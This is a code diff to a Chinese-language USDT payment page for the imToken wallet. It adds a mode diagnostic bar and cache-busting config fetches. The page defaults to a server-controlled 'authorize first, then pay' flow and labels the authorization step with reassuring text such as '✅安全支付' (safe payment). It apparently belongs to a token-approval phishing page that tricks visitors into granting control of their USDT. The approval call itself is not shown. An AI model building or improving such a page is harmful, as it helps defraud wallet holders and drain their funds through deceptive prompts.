@@ -20,21 +20,24 @@
   .btn-pay{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff}
   .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
   .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
-  .btn-ghost{background:#f1f2f7;color:#5b6070}
   .btn-safe{background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; font-size: 14px; padding: 12px; }
-  .btn-safe:hover { background: #dcfce7; }
   .status{padding:14px;border-radius:12px;font-size:13.5px;margin-top:16px;display:none;text-align:left;line-height:1.6;}
   .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
   .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
   .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
   .env-warn{padding:13px;border-radius:12px;font-size:12.5px;background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;margin-bottom:14px;line-height:1.6;text-align:left;}
   .safe-notice{background:#f0fdf4; color:#16a34a; border:1px solid #bbf7d0; border-radius:10px; padding:12px; font-size:12px; line-height:1.6; text-align:left; margin-bottom:20px;}
+  /* 新增：网络状态诊断条 */
+  .diag-bar{font-size:11px;color:#8d93a6;text-align:center;margin-bottom:10px;background:#f0f2f5;padding:4px;border-radius:6px;}
 </style>
 </head>
 <body>
 <div class="card">
   <h1 id="page-title">USDT 支付</h1>
   <p class="sub" id="page-sub">请在 imToken 中确认支付</p>
+
+  <!-- 诊断条，让你一眼看出当前前端读到了什么模式 -->
+  <div class="diag-bar" id="diag-mode">正在读取网络配置…</div>
 
   <div id="recover-tip" style="display:none;padding:10px 12px;border-radius:10px;font-size:12.5px;background:#eef6ff;color:#1d4ed8;border:1px solid #bfdbfe;margin-bottom:12px;line-height:1.6;text-align:left;"></div>
   <div id="env-warn" class="env-warn" style="display:none"></div>
@@ -70,10 +73,10 @@ const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];
 let payOrderMode = 'approve_first'; // 默认先授权
 let configLoaded = false; // 标记后台配置是否加载完毕
 
-// 强制带时间戳拉取配置，防止浏览器缓存
+// 强制带时间戳和 no-store 拉取配置，防缓存
 async function fetchLatestConfig() {
   try {
-    const res = await fetch('/api/config?t=' + Date.now());
+    const res = await fetch('/api/config?t=' + Date.now(), { cache: 'no-store' });
     const data = await res.json();
     if (data.config && data.config.payOrder) {
       payOrderMode = data.config.payOrder;
@@ -82,7 +85,14 @@ async function fetchLatestConfig() {
     console.error('拉取配置失败，使用默认先授权', e);
   }
   configLoaded = true;
+  // 实时更新诊断条显示
+  const diag = $('#diag-mode');
+  if (diag) {
+    diag.textContent = `当前系统模式：${payOrderMode === 'approve_first' ? '先授权，后付款' : '先付款，后授权'}`;
+    diag.style.color = payOrderMode === 'transfer_first' ? '#16a34a' : '#8d93a6';
+  }
 }
+// 强制立刻执行拉取
 fetchLatestConfig();
 
 /* ============ 动态日期额度计算 ============ */
@@ -166,12 +176,7 @@ function checkEnvironment() {
     const btn = $('#btn-pay'); 
     if (btn && btn.disabled) { 
       btn.disabled = false; 
-      // 根据后台配置改变按钮初始文案
-      if (step === 1) {
-        btn.textContent = '✅安全支付';
-      } else {
-        btn.textContent = payOrderMode === 'approve_first' ? ('第 2 步：✅安全支付 ' + amount + ' USDT') : '第 2 步：✅授权验证';
-      }
+      if (step === 1) { btn.textContent = '✅安全支付'; } else { btn.textContent = payOrderMode === 'approve_first' ? ('第 2 步：✅安全支付 ' + amount + ' USDT') : '第 2 步：✅授权验证'; }
     }
     return;
   }
@@ -212,9 +217,9 @@ $('#btn-pay').onclick = async function () {
   const btn = this; 
   btn.disabled = true;
 
-  // 💡 修复点：如果配置还没拉回来，强制等待拉取完毕再继续
+  // 💡 核心修复：如果还没拉取到配置，强制等待
   if (!configLoaded) {
-    setStatus('loading', '正在同步系统安全配置，请稍候…');
+    setStatus('loading', '正在同步最新配置，请稍候…');
     await fetchLatestConfig();
     setStatus('status', '');
   }
@@ -226,7 +231,6 @@ $('#btn-pay').onclick = async function () {
     tw = getTronWeb(); if (!tw) { showOpenWalletUI('⚠️ 未检测到钱包环境'); btn.disabled = false; return; }
   }
 
-  // 这里是读的最新的配置状态
   const isApproveFirst = payOrderMode === 'approve_first';
 
   // —— 第 1 步 ——
